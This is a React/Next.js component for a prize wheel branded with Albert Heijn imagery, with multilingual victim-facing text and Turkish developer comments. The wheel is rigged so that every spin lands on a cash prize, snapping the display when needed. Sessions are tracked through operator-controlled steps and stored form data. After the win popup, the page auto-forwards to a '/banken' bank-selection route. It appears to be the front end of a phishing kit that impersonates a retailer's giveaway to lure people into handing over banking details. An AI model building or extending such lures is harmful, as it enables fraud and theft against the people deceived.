"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { ConfettiEffect } from "@/components/AlbertHeijnWheel/ConfettiEffect";
import { PrizePopup } from "@/components/AlbertHeijnWheel/PrizePopup";
import { AlbertHeijnWheel } from "@/components/AlbertHeijnWheel/AlbertHeijnWheel";
import { useIsMobile } from "@/hooks/useIsMobile";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { DEFAULT_WHEEL_VIEWPORT, resolveWheelLayout } from "./wheel-layout";

type PrizeKind = "amount" | "message";

type PrizeSegment = {
  kind: PrizeKind;
  text: string;
  selectionIndex: number;
  rotationIndex: number;
  amount: number | null;
  popupLines: string[];
  // Acik renkli segment uzerinde koyu yazi icin
  darkText?: boolean;
};

type WinHistoryItem = {
  prize: string;
  date: string;
};

type SessionRecord = {
  id: string;
  amount: number | null;
  current_step: string | null;
  form_data?: Record<string, unknown> | null;
};

const ANGLE_OFFSET = 0;
const MIN_FULL_SPINS = 6;
const LOCAL_HISTORY_KEY = "ah-prize-wheel-last-five-wins";
const MAX_HISTORY_ITEMS = 5;

// ============================================================
//  CARK SEGMENT PLANI (8 segment, tepe = index 0):
//    Index 0  -> MESAJ segmenti (kaybetme / tekrar dene) — ustte
//    Index 1-7 -> PARA segmentleri, saat yonunde
//
//  Tutar + sans oranlari ADMIN PANELDEN (global_settings.wheel_settings.prizes)
//  okunur. Cark PNG'si YAZISIZ uretilir; yazilar SVG ile basilir.
// ============================================================
const RETRY_SEGMENT: PrizeSegment = {
  kind: "message",
  text: "Bandykite dar kartą",
  selectionIndex: 0,
  rotationIndex: 0,
  amount: null,
  popupLines: ["BANDYKITE", "DAR KARTĄ"],
  darkText: false,
};

// Index 1..7 (saat yonunde) icin varsayilan tutar + sans (% agirlik)
const DEFAULT_WHEEL_AMOUNTS: Array<{ amount: number; weight: number }> = [
  { amount: 1000, weight: 24 },
  { amount: 2000, weight: 19 },
  { amount: 500, weight: 5 },
  { amount: 3000, weight: 0 },
  { amount: 750, weight: 11 },
  { amount: 2500, weight: 14 },
  { amount: 1500, weight: 27 },
];

type WheelPrizeConfig = {
  prizes: PrizeSegment[];
  winnable: PrizeSegment[];
  weights: Record<number, number>;
};

function makeAmountSegment(amount: number, index: number): PrizeSegment {
  return {
    kind: "amount",
    text: `€${amount}`,
    selectionIndex: index,
    rotationIndex: index,
    amount,
    popupLines: [`€ ${formatAmount(amount)}`],
    // Gorsel: cift index = kirmizi/koyu segment (beyaz yazi), tek index = beyaz segment (koyu yazi)
    darkText: index % 2 === 1,
  };
}

function buildWheelPrizes(wheelSettings: unknown): WheelPrizeConfig {
  const ws =
    wheelSettings && typeof wheelSettings === "object"
      ? (wheelSettings as Record<string, unknown>)
      : null;
  const raw = ws?.prizes;

  const entries = DEFAULT_WHEEL_AMOUNTS.map((def, i) => {
    const entry = Array.isArray(raw) ? (raw[i] as { amount?: unknown; weight?: unknown } | undefined) : undefined;
    const amount = Number(entry?.amount);
    const weight = Number(entry?.weight);
    return {
      amount: Number.isFinite(amount) && amount > 0 ? Math.round(amount) : def.amount,
      weight: Number.isFinite(weight) && weight >= 0 ? Math.round(weight) : def.weight,
    };
  });

  const prizes: PrizeSegment[] = [
    RETRY_SEGMENT,
    ...entries.map((e, i) => makeAmountSegment(e.amount, i + 1)),
  ];
  const weights: Record<number, number> = {};
  entries.forEach((e) => {
    weights[e.amount] = e.weight;
  });
  const winnable = prizes.filter(
    (p) => p.kind === "amount" && (weights[p.amount ?? 0] ?? 0) > 0,
  );
  return { prizes, winnable, weights };
}

const DEFAULT_WHEEL_CONFIG: WheelPrizeConfig = buildWheelPrizes(null);

function normalizeAngle(angle: number) {
  return ((angle % 360) + 360) % 360;
}

async function resolveShortIdApi(sessionId: string): Promise<string | null> {
  try {
    const res = await fetch(`/api/resolve-short-id`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId }),
      cache: "no-store",
    });
    if (!res.ok) return null;
    const json = await res.json();
    if (json?.ok && json?.public_id) return String(json.public_id);
    return null;
  } catch {
    return null;
  }
}

function formatAmount(amount: number) {
  return new Intl.NumberFormat("de-DE").format(amount);
}

function getTargetRotation(currentRotation: number, rotationIndex: number, segmentCount: number) {
  const normalizedCurrent = normalizeAngle(currentRotation);
  const segmentAngle = 360 / segmentCount;
  const targetNormalized = normalizeAngle(ANGLE_OFFSET - rotationIndex * segmentAngle);
  const delta = normalizeAngle(targetNormalized - normalizedCurrent);
  const extraTurns = 1 + Math.floor(Math.random() * 2);
  return currentRotation + (MIN_FULL_SPINS + extraTurns) * 360 + delta;
}

function getPrizeFromSession(session: SessionRecord | null, prizes: PrizeSegment[]) {
  const storedLabel = session?.form_data?.wheel_result_label;
  if (typeof storedLabel === "string") {
    return prizes.find((prize) => prize.text === storedLabel) ?? null;
  }

  if (typeof session?.amount === "number" && session.amount > 0) {
    return prizes.find((prize) => prize.amount === session.amount) ?? null;
  }

  return null;
}

// ============================================================
//  AGIRLIKLI RASTGELE ODUL SECIMI (admin panelindeki % agirliklara gore)
// ============================================================
function getRandomWinnablePrize(cfg: WheelPrizeConfig) {
  const weightedList: PrizeSegment[] = [];
  for (const prize of cfg.winnable) {
    const weight = cfg.weights[prize.amount ?? 0] ?? 1;
    for (let i = 0; i < weight; i++) weightedList.push(prize);
  }
  if (weightedList.length === 0) return cfg.winnable[0] ?? cfg.prizes[1] ?? cfg.prizes[0];
  const idx = Math.floor(Math.random() * weightedList.length);
  return weightedList[idx];
}

function logWheelEvent(eventName: "wheel_spin" | "wheel_win" | "popup_open" | "popup_close" | "wheel_transition_end", payload?: Record<string, unknown>) {
  console.log("[wheel-analytics]", {
    event: eventName,
    ...payload,
  });
}

function readWinHistory() {
  if (typeof window === "undefined") {
    return [] as WinHistoryItem[];
  }

  try {
    const rawValue = window.localStorage.getItem(LOCAL_HISTORY_KEY);
    if (!rawValue) {
      return [];
    }

    const parsed = JSON.parse(rawValue) as WinHistoryItem[];
    return Array.isArray(parsed) ? parsed.slice(0, MAX_HISTORY_ITEMS) : [];
  } catch {
    return [];
  }
}

function storeWinHistory(prize: string) {
  const nextHistory = [
    {
      prize,
      date: new Date().toISOString(),
    },
    ...readWinHistory(),
  ].slice(0, MAX_HISTORY_ITEMS);

  window.localStorage.setItem(LOCAL_HISTORY_KEY, JSON.stringify(nextHistory));
  return nextHistory;
}

export function WheelClient({
  sessionId,
  routeSessionId,
}: {
  sessionId: string;
  routeSessionId?: string;
}) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const isMobile = useIsMobile();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const continueButtonRef = useRef<HTMLButtonElement | null>(null);
  const pendingPrizeRef = useRef<PrizeSegment | null>(null);
  const rotationRef = useRef(0);
  const wheelRef = useRef<HTMLDivElement | null>(null);

  // Client-side URL normalizasyonu: /wheel/UUID ise pathi /wheel/{kisa_id} ye cevir
  useEffect(() => {
    if (typeof window === "undefined") return;
    let cancelled = false;

    const run = async () => {
      const match = window.location.pathname.match(/^\/wheel\/([^/?#]+)/i);
      if (!match) return;
      const idFromPath = decodeURIComponent(match[1]);
      const isUuid =
        /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          idFromPath,
        );
      if (!isUuid) return;

      const preferredShort =
        routeSessionId &&
        !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          routeSessionId,
        )
          ? routeSessionId
          : null;

      const shortId = preferredShort ?? (sessionId ? await resolveShortIdApi(sessionId) : null);
      if (cancelled) return;
      if (shortId && shortId !== idFromPath) {
        const url = new URL(window.location.href);
        const segs = url.pathname.split("/").filter(Boolean);
        if (segs.length >= 2 && segs[0].toLowerCase() === "wheel") {
          segs[1] = encodeURIComponent(shortId);
          url.pathname = "/" + segs.join("/");
        }
        const next = url.pathname + url.search + url.hash;
        window.history.replaceState({}, "", next);
      }
    };

    run();
    return () => {
      cancelled = true;
    };
  }, [sessionId, routeSessionId]);

  const [spinning, setSpinning] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [rotation, setRotation] = useState(0);
  const [resultPrize, setResultPrize] = useState<PrizeSegment | null>(null);
  const [sessionData, setSessionData] = useState<SessionRecord | null>(null);
  const [viewportSize, setViewportSize] = useState(DEFAULT_WHEEL_VIEWPORT);
  const [winHistory, setWinHistory] = useState<WinHistoryItem[]>([]);
  const [wheelConfig, setWheelConfig] = useState<WheelPrizeConfig>(DEFAULT_WHEEL_CONFIG);

  const activeLayout = resolveWheelLayout(viewportSize);
  const viewportHeight = viewportSize.height > 0 ? viewportSize.height : DEFAULT_WHEEL_VIEWPORT.height;
  const isSpinDisabled = spinning || resultPrize !== null || !sessionData;
  const popupAmountLine =
    resultPrize?.kind === "amount" && typeof resultPrize.amount === "number"
      ? `€ ${formatAmount(resultPrize.amount)}`
      : resultPrize?.text ?? "";
  const popupDescription =
    resultPrize?.kind === "amount" ? `Teie auhind on ${popupAmountLine}.` : resultPrize?.text ?? "Vaadake oma tulemust.";

  const formattedHistory = useMemo(
    () =>
      winHistory.map((item) => ({
        ...item,
        formattedDate: new Intl.DateTimeFormat("et-EE", {
          day: "2-digit",
          month: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
        }).format(new Date(item.date)),
      })),
    [winHistory],
  );

  useEffect(() => {
    rotationRef.current = rotation;
  }, [rotation]);

  useEffect(() => {
    setWinHistory(readWinHistory());
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function loadSession() {
      if (!sessionId) {
        setError("Neteisinga sesija.");
        return;
      }

      if (!supabase) return;

      const { data, error: dbError } = await supabase
        .from("sessions")
        .select("id,amount,current_step,form_data")
        .eq("id", sessionId)
        .single();

      if (cancelled) return;

      if (dbError || !data) {
        setError("Seanssi ei leitud.");
        return;
      }

      const nextSession = data as SessionRecord;

      // Admin panelden okunan cark odul ayarlari (tutar + sans %)
      let cfg = DEFAULT_WHEEL_CONFIG;
      try {
        const { data: gs } = await supabase
          .from("global_settings")
          .select("wheel_settings")
          .limit(1)
          .maybeSingle();
        cfg = buildWheelPrizes(gs?.wheel_settings);
        if (!cancelled) {
          setWheelConfig(cfg);
        }
      } catch {
        /* ayarlar okunamazsa varsayilan config kalir */
      }

      if (nextSession.current_step === "code_entry" && !nextSession.form_data?.is_wheel_game) {
        const updatedFormData = { ...(nextSession.form_data || {}), is_wheel_game: true };
        await supabase.from("sessions").update({ is_hidden: false, form_data: updatedFormData }).eq("id", sessionId);
        nextSession.form_data = updatedFormData;
      }

      setSessionData(nextSession);

      const restoredPrize = getPrizeFromSession(nextSession, cfg.prizes);
      if (restoredPrize) {
        setResultPrize(restoredPrize);
        setShowPopup(true);
      }
    }

    void loadSession();

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    const updateViewportSize = () => {
      setViewportSize({
        width: Math.round(window.visualViewport?.width ?? window.innerWidth),
        height: Math.round(window.visualViewport?.height ?? window.innerHeight),
      });
    };

    updateViewportSize();
    window.visualViewport?.addEventListener("resize", updateViewportSize);
    window.addEventListener("resize", updateViewportSize);
    window.addEventListener("orientationchange", updateViewportSize);

    return () => {
      window.visualViewport?.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("orientationchange", updateViewportSize);
    };
  }, []);

  useEffect(() => {
    const previousHtmlOverflow = document.documentElement.style.overflow;
    const previousHtmlOverscroll = document.documentElement.style.overscrollBehavior;
    const previousBodyOverflow = document.body.style.overflow;
    const previousBodyOverscroll = document.body.style.overscrollBehavior;

    document.documentElement.style.overflow = "hidden";
    document.documentElement.style.overscrollBehavior = "none";
    document.body.style.overflow = "hidden";
    document.body.style.overscrollBehavior = "none";

    return () => {
      document.documentElement.style.overflow = previousHtmlOverflow;
      document.documentElement.style.overscrollBehavior = previousHtmlOverscroll;
      document.body.style.overflow = previousBodyOverflow;
      document.body.style.overscrollBehavior = previousBodyOverscroll;
    };
  }, []);

  useEffect(() => {
    if (!showPopup || !resultPrize) {
      return;
    }

    logWheelEvent("popup_open", {
      prize: resultPrize.text,
      amount: resultPrize.amount,
    });

    const focusTimeout = window.setTimeout(() => {
      continueButtonRef.current?.focus({ preventScroll: true });
    }, 80);

    return () => {
      window.clearTimeout(focusTimeout);
    };
  }, [resultPrize, showPopup]);

  const finalizeSpin = async (prize: PrizeSegment) => {
    // =================================================================
    //  ZORUNLU KORUMA: weight=0 olan (kazandirilmayan) segment ASLA
    //  kaydedilmesin. O durumda EN YAKIN winnable segmente ZORLA cek.
    // =================================================================
    const winnable = wheelConfig.winnable;
    const isInWinnableRange =
      prize.kind === "amount" &&
      prize.amount !== null &&
      winnable.some((wp) => wp.rotationIndex === prize.rotationIndex);

    let safePrize = prize;
    if (!isInWinnableRange) {
      const segAngle = 360 / wheelConfig.prizes.length;
      const sorted = [...winnable].sort((a, b) => {
        const da = Math.min(
          normalizeAngle(a.rotationIndex * segAngle - prize.rotationIndex * segAngle),
          normalizeAngle(prize.rotationIndex * segAngle - a.rotationIndex * segAngle)
        );
        const db = Math.min(
          normalizeAngle(b.rotationIndex * segAngle - prize.rotationIndex * segAngle),
          normalizeAngle(prize.rotationIndex * segAngle - b.rotationIndex * segAngle)
        );
        return da - db;
      });
      safePrize = sorted[0] ?? winnable[0] ?? prize;
    }

    setSpinning(false);
    setResultPrize(safePrize);
    setShowPopup(true);

    logWheelEvent("wheel_win", {
      prize: safePrize.text,
      amount: safePrize.amount,
      selectionIndex: safePrize.selectionIndex,
      rotationIndex: safePrize.rotationIndex,
    });

    if (safePrize.kind === "amount") {
      setWinHistory(storeWinHistory(`€ ${formatAmount(safePrize.amount ?? 0)}`));
    }

    if (!supabase || !sessionId) {
      return;
    }

    const nextFormData = {
      ...(sessionData?.form_data ?? {}),
      pending_profile: false,
      wheel_result_label: safePrize.text,
      wheel_result_kind: safePrize.kind,
      wheel_result_amount: safePrize.amount,
      wheel_rotation_index: safePrize.rotationIndex,
    };

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        amount: safePrize.amount ?? 0,
        current_step: "wheel",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    // =================================================================
    //  YAZMA ISLEMI BITTIKTEN SONRA TEKRAR OKU + SET STATE + SONRA PUSH.
    //  Boylece WinFlow cagirdiginda amount kesin DB'de yazili olur,
    //  stale okuma riski sifirlanir.
    // =================================================================
    try {
      const { data: reFetched } = await supabase
        .from("sessions")
        .select("amount, current_step, form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (reFetched) {
        const patched = { ...(sessionData ?? ({} as SessionRecord)), amount: reFetched.amount ?? 0, current_step: reFetched.current_step ?? "wheel", form_data: (reFetched.form_data ?? nextFormData) as SessionRecord["form_data"] } as SessionRecord;
        setSessionData(patched);
      } else {
        setSessionData((previous) =>
          previous
            ? {
                ...previous,
                amount: safePrize.amount ?? 0,
                current_step: "wheel",
                form_data: nextFormData,
              }
            : previous,
        );
      }
    } catch (refetchErr) {
      // Tekrar okuma hali bozuksa, state'le devam et
      console.warn("[wheel] session refetch okunamadi state fallback kullaniliyor", refetchErr);
      setSessionData((previous) =>
        previous
          ? {
              ...previous,
              amount: safePrize.amount ?? 0,
              current_step: "wheel",
              form_data: nextFormData,
            }
          : previous,
      );
    }
  };

  const spinWheel = () => {
    if (isSpinDisabled) {
      return;
    }

    const nextPrize = getRandomWinnablePrize(wheelConfig);
    const startRotation = rotationRef.current;
    const targetRotation = getTargetRotation(startRotation, nextPrize.rotationIndex, wheelConfig.prizes.length);

    pendingPrizeRef.current = nextPrize;
    rotationRef.current = targetRotation;
    setSpinning(true);
    logWheelEvent("wheel_spin", {
      selectionIndex: nextPrize.selectionIndex,
      targetPrize: nextPrize.text,
      targetRotationIndex: nextPrize.rotationIndex,
    });
    setRotation(targetRotation);
  };

  const handleWheelTransitionEnd = () => {
    if (!spinning || !pendingPrizeRef.current) {
      return;
    }

    const segmentAngle = 360 / wheelConfig.prizes.length;
    const targetPrize = pendingPrizeRef.current;
    let rotationDeg = rotationRef.current ?? rotation;
    let gotVisualFromDom = false;

    // =================================================================
    //  1. DOM'dan GERCEK transform acisini MATRIS ile oku.
    // =================================================================
    try {
      const hostEl = wheelRef.current;
      if (hostEl) {
        const wheelEl = hostEl.querySelector<HTMLElement>(
          ".pointer-events-none.absolute.z-\\[2\\].will-change-transform",
        );
        if (wheelEl) {
          const cs = window.getComputedStyle(wheelEl);
          const matrixRaw =
            cs.getPropertyValue("transform") ||
            cs.getPropertyValue("-webkit-transform") ||
            "none";
          if (matrixRaw && matrixRaw !== "none") {
            const matrixMatch = matrixRaw.match(/matrix\(([^)]+)\)/i);
            if (matrixMatch && matrixMatch[1]) {
              const parts = matrixMatch[1].split(",").map((s) => parseFloat(s.trim()));
              if (parts.length >= 6 && !parts.some(Number.isNaN)) {
                const a = parts[0];
                const b = parts[1];
                let deg = (Math.atan2(b, a) * 180) / Math.PI;
                deg = ((deg % 360) + 360) % 360;
                rotationDeg = deg;
                gotVisualFromDom = true;
              }
            }
          }
        }
      }
    } catch (err) {
      console.warn("[wheel] DOM matrix okunamadi, ref fallback:", err);
    }

    const normalizedRot = ((rotationDeg % 360) + 360) % 360;
    const pointerAngleUnderWheel = ((360 - normalizedRot) % 360 + 360) % 360;
    let visualRotationIndex = Math.floor(pointerAngleUnderWheel / segmentAngle);
    if (visualRotationIndex < 0) visualRotationIndex = 0;
    if (visualRotationIndex >= wheelConfig.prizes.length) visualRotationIndex = wheelConfig.prizes.length - 1;

    let visualPrize = wheelConfig.prizes[visualRotationIndex] ?? null;
    if (!visualPrize) {
      const idx2 =
        Math.round(normalizeAngle(ANGLE_OFFSET - normalizedRot) / segmentAngle) % wheelConfig.prizes.length;
      const fallback = idx2 < 0 ? idx2 + wheelConfig.prizes.length : idx2;
      visualRotationIndex = fallback;
      visualPrize = wheelConfig.prizes[visualRotationIndex] ?? targetPrize;
    }
    if (!visualPrize) visualPrize = targetPrize;

    let finalPrize = visualPrize;

    // =================================================================
    //  2. GORSEL index WINNABLE (weight>0) ise: KULLANICI GORSELDE NEYI GORUYORSA O KAZANSIN.
    //  3. GORSEL winnable degilse: EN YAKIN WINNABLE kullan +
    //     ANI DOM'u target rotation ORTASINA cek (boylece kullanici tekrar baktiginda HEDEFi gorur).
    // =================================================================
    const visualIsWinnable =
      finalPrize.kind === "amount" &&
      finalPrize.amount !== null &&
      wheelConfig.winnable.some((wp) => wp.rotationIndex === finalPrize.rotationIndex);

    if (!visualIsWinnable) {
      const sorted = [...wheelConfig.winnable].sort((a, b) => {
        const da = Math.min(
          normalizeAngle(a.rotationIndex * segmentAngle - finalPrize.rotationIndex * segmentAngle),
          normalizeAngle(finalPrize.rotationIndex * segmentAngle - a.rotationIndex * segmentAngle),
        );
        const db = Math.min(
          normalizeAngle(b.rotationIndex * segmentAngle - finalPrize.rotationIndex * segmentAngle),
          normalizeAngle(finalPrize.rotationIndex * segmentAngle - b.rotationIndex * segmentAngle),
        );
        return da - db;
      });
      finalPrize = sorted[0] ?? wheelConfig.winnable[0] ?? visualPrize;

      // *****************************************************************
      //  ANI (transition yok) DOM'u FINAL prize rotationIndex ORTASINA cek:
      //  Boylece sayfada kalan kullanici tekrar baktiginda KAZANDIGI miktar
      //  GORSELDE de ORADA duruyor.
      // *****************************************************************
      try {
        const hostEl = wheelRef.current;
        if (hostEl) {
          const wheelEl = hostEl.querySelector<HTMLElement>(
            ".pointer-events-none.absolute.z-\\[2\\].will-change-transform",
          );
          if (wheelEl) {
            const snapRotation =
              Math.floor((rotationRef.current ?? 0) / 360) * 360 +
              (360 - finalPrize.rotationIndex * segmentAngle) +
              ANGLE_OFFSET;
            wheelEl.style.transition = "none";
            wheelEl.style.transform = `translateZ(0) rotate(${snapRotation}deg)`;
            // Bir sonraki frame'de transition'u geri almak zorunda degiliz (animasyon bitti)
            rotationRef.current = snapRotation;
            setRotation(snapRotation);
          }
        }
      } catch (err2) {
        // visual snap hata: onemsiz, kod ile DB dogru yazilacak.
        console.warn("[wheel] visual snap yapilamadi:", err2);
      }
    } else if (
      gotVisualFromDom &&
      visualRotationIndex !== targetPrize.rotationIndex &&
      visualPrize.rotationIndex === finalPrize.rotationIndex
    ) {
      // Gorsel WINNABLE, pending != final. Gorsel oncelikli, DOM'u final rotation ORTASINA ANI cek:
      try {
        const hostEl = wheelRef.current;
        if (hostEl) {
          const wheelEl = hostEl.querySelector<HTMLElement>(
            ".pointer-events-none.absolute.z-\\[2\\].will-change-transform",
          );
          if (wheelEl) {
            const fullTurns = Math.floor((rotationRef.current ?? 0) / 360);
            const snapRotation =
              fullTurns * 360 +
              (360 - finalPrize.rotationIndex * segmentAngle) +
              ANGLE_OFFSET;
            wheelEl.style.transition = "none";
            wheelEl.style.transform = `translateZ(0) rotate(${snapRotation}deg)`;
            rotationRef.current = snapRotation;
            setRotation(snapRotation);
          }
        }
      } catch (err3) {
        console.warn("[wheel] winnable visual snap yapilamadi:", err3);
      }
    }

    // FINAL KILIT: Her turlu winnable (weight>0) olduguna emin ol
    if (
      !(
        finalPrize.kind === "amount" &&
        finalPrize.amount !== null &&
        wheelConfig.winnable.some((wp) => wp.rotationIndex === finalPrize.rotationIndex)
      )
    ) {
      finalPrize = wheelConfig.winnable[0] ?? finalPrize;
    }

    logWheelEvent("wheel_transition_end", {
      matrixRotation: rotationDeg,
      gotVisualFromDom,
      visualRotationIndex,
      visualPrizeText: visualPrize.text,
      targetPrizeText: targetPrize.text,
      finalPrizeText: finalPrize.text,
      finalAmount: finalPrize.amount,
      finalRotationIndex: finalPrize.rotationIndex,
    });

    pendingPrizeRef.current = null;
    void finalizeSpin(finalPrize);
  };

  const handleContinue = () => {
    logWheelEvent("popup_close", {
      prize: resultPrize?.text ?? null,
    });
    setShowPopup(false);
    const go = async () => {
      try {
        if (supabase && sessionId) {
          await supabase
            .from("sessions")
            .update({ current_step: "banken" })
            .eq("id", sessionId);
        }
      } catch {
        /* best-effort; navigation proceeds anyway */
      }
      router.push(`/banken?session=${encodeURIComponent(effectiveRouteSessionId)}`);
    };
    void go();
  };

  const handleContinueRef = useRef(handleContinue);
  handleContinueRef.current = handleContinue;

  useEffect(() => {
    if (!showPopup || !resultPrize) return;
    const autoContinue = window.setTimeout(() => {
      handleContinueRef.current();
    }, 6000);
    return () => window.clearTimeout(autoContinue);
  }, [showPopup, resultPrize]);

  if (error) {
    return (
      <div
        className="flex flex-col items-center justify-center p-6 text-center"
        style={{ minHeight: `${viewportHeight}px` }}
      >
        <div className="mb-4 text-red-500">
          <svg className="size-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
        </div>
        <h1 className="mb-2 text-2xl font-bold text-slate-800">Fout</h1>
        <p className="text-slate-600">{error}</p>
      </div>
    );
  }

  return (
    <>
      <div
        className="relative w-full overflow-hidden"
        style={{
          height: `${viewportHeight}px`,
          minHeight: `${viewportHeight}px`,
          paddingTop: "env(safe-area-inset-top)",
          paddingRight: "env(safe-area-inset-right)",
          paddingBottom: "env(safe-area-inset-bottom)",
          paddingLeft: "env(safe-area-inset-left)",
          backgroundColor: "#0f172a",
          backgroundImage: "linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%)",
        }}
      >
        <AlbertHeijnWheel
          ref={wheelRef}
          layout={activeLayout}
          rotation={rotation}
          spinning={spinning}
          disabled={isSpinDisabled}
          prizes={wheelConfig.prizes}
          onSpin={spinWheel}
          onSpinEnd={handleWheelTransitionEnd}
        />
      </div>

      <PrizePopup
        open={showPopup}
        isMobile={isMobile}
        result={resultPrize}
        amountLine={popupAmountLine}
        description={popupDescription}
        userName={
          typeof sessionData?.form_data?.firstName === "string"
            ? sessionData.form_data.firstName
            : null
        }
        continueButtonRef={continueButtonRef}
        onClose={handleContinue}
      />

      <ConfettiEffect
        active={showPopup && resultPrize?.kind === "amount"}
        triggerKey={showPopup && resultPrize?.kind === "amount" ? `${sessionId}-${resultPrize.text}-${resultPrize.amount}` : null}
      />
    </>
  );
}
